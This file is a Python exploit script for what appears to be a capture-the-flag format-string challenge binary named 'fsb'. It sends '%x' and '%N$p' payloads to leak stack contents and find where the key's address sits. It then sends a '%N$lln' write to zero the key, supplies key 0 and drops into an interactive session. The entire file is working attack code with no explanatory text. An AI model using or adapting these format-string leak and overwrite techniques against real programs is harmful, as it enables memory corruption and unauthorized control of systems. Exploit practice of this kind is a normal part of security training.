from zio import *
import struct
target = "./fsb 1111"

def get_io(target):
	io = zio(target, timeout = 9999)
	return io

def get_esp_addr(io):
	raw_input(":")
	io.read_until("Give me some format strings(1)\n")
	ret_addr = 0x0804869F

	io.write('%x.'*19 + "-\x00")
	print ""
	data = io.read_until("-").split(".")

	ebp_set = int(raw_input("ebp:"), 16)

	for index, item in enumerate(data[:-1]):
		stack_addr = int(item, 16)
		print "offset(%d):%s"%(index, hex(stack_addr - ebp_set))

	ebp_addr = int(data[13], 16) - 0x8
	print "ebp:", hex(ebp_addr)

	io.read_until("Give me some format strings(2)\n")
	io.write("nihao\x00")
	io.read_until("Give me some format strings(3)\n")
	io.write("nihao\x00")
	io.read_until("Give me some format strings(4)\n")
	io.write("nihao\x00")
	io.interact()

def generate_buff(begin_pos, length):
	index = begin_pos
	buff = ""
	last_len = 0
	while True:
		tmp = "%%%d$p."%(index)
		last_len = len(tmp)
		buff += tmp
		if len(buff) + last_len + 1 > length:
			return buff, index
		index += 1


def match_addr(data, index, match_str):
	cur_pos = index
	for item in data.split(".")[:-1]:
		if item == match_str:
			return cur_pos
		cur_pos += 1
	return -1

def run_manual(io, pos, stage):
	print ""
	io.write("%%%d$lln\x00"%pos)
	data = ""
	if stage < 3:
		data = io.read_until("G")[:-1]
		while (stage < 3):
			io.write("nihao\x00")
			stage += 1
			if stage == 3:
				io.read_until("W")
				break
			else:
				io.read_until("G")
	else:
		data = io.read_until("W")[:-1]

	#key = struct.unpack("Q", data)[0]
	#print "key is:", key
	key = 0
	data = "%d"%key
	io.read_until("key :")
	io.write(data + "\x00")
	io.interact()

def find_addr(io):
	#raw_input(":")
	io.read_until("Give me some format strings(1)\n")
	ret_addr = 0x0804869F

	begin_pos = 141
	data, index = generate_buff(begin_pos, 100)
	io.write(data)
	print ""

	data = io.read_until("G")
	io.read_until("ive me some format strings(2)\n")
	#find key addr
	pos  = match_addr(data, begin_pos, "0x804a060")
	if pos != -1:
		print "find one, pos = ",pos 
		raw_input("here:")
		run_manual(io, pos, 1)
	
	begin_pos = index + 1
	data, index = generate_buff(begin_pos, 100)
	io.write(data)
	print ""
	data = io.read_until("G")
	io.read_until("ive me some format strings(3)\n")
	pos  = match_addr(data, begin_pos, "0x804a060")
	if pos != -1:
		print "find one, pos = ",pos 
		raw_input("here:")
		run_manual(io, pos, 2)
	
	begin_pos = index + 1
	data, index = generate_buff(begin_pos, 100)
	io.write(data)
	print ""
	data = io.read_until("G")
	io.read_until("ive me some format strings(4)\n")
	pos  = match_addr(data, begin_pos, "0x804a060")
	if pos != -1:
		print "find one, pos = ",pos 
		raw_input("here:")
		run_manual(io, pos, 3)
	
	begin_pos = index + 1
	data, index = generate_buff(begin_pos, 100)
	io.write(data)
	print ""
	io.read_until("key :")
	io.write("nihao\n")
	io.read(30)

while True:
	io = get_io(target)
	find_addr(io)